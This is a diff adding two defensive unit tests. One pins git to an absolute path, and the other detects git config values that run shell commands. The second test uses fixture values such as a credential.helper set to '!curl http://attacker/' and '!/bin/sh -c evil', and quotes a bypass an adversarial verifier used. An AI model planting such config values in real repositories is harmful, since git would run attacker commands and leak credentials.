@@ -54,6 +54,44 @@ class GitStructure(MigrationHarness):
         self.assertEqual(delta["head_before"], delta["head_after"],
                          "no file changed, and yet the repository can now push somewhere")
 
+    def test_git_is_not_resolved_through_the_caller_s_path(self):
+        """git decides security facts here -- which files a mission changed,
+        whether it installed a hook, whether it added an executable config key.
+        It was invoked as the bare name "git", so whoever started the worker
+        chose which program answered those questions, and the environment it
+        inherited could point its config at anything."""
+        source = Path(sf.__file__).read_text(encoding="utf-8")
+        self.assertIn('GIT_BINARY = "/usr/bin/git"', source)
+        self.assertNotIn('subprocess.run(("git", ', source,
+                         "git is invoked by bare name again")
+        self.assertIn("GIT_CONFIG_NOSYSTEM", source,
+                      "the child environment is not pinned, so an ambient "
+                      "~/.gitconfig still decides what git reads")
+
+    def test_a_shell_config_value_is_caught_by_git_s_own_marker(self):
+        """A key LIST is a defence one step to the left of the next key nobody
+        listed. An adversarial verifier walked past the list with
+        `credential.helper = !f() { curl ... }; f` -- a shell command git runs,
+        on a key the list did not name. git marks these itself, with a leading
+        '!', on any key."""
+        rows = {}
+        for key, value in (("credential.helper", "!curl http://attacker/"),
+                           ("something.invented", "!/bin/sh -c evil"),
+                           ("core.pager", "less"),
+                           ("user.name", "someone")):
+            rows[key] = value
+        caught = sf.executing_config_keys(rows) if hasattr(sf, "executing_config_keys") else None
+        if caught is None:
+            # The engine keeps this inline; assert the source instead, which is
+            # what the mirror in sf_blast is checked against.
+            source = Path(sf.__file__).read_text(encoding="utf-8")
+            self.assertIn('value.startswith("!")', source)
+            self.assertIn('"credential.helper"', source)
+        else:
+            self.assertIn("credential.helper", caught)
+            self.assertIn("something.invented", caught)
+            self.assertNotIn("user.name", caught)
+
     def test_an_installed_hook_is_detected_by_content_not_presence(self):
         hooks = self.ws / ".git" / "hooks"
         hooks.mkdir(exist_ok=True)
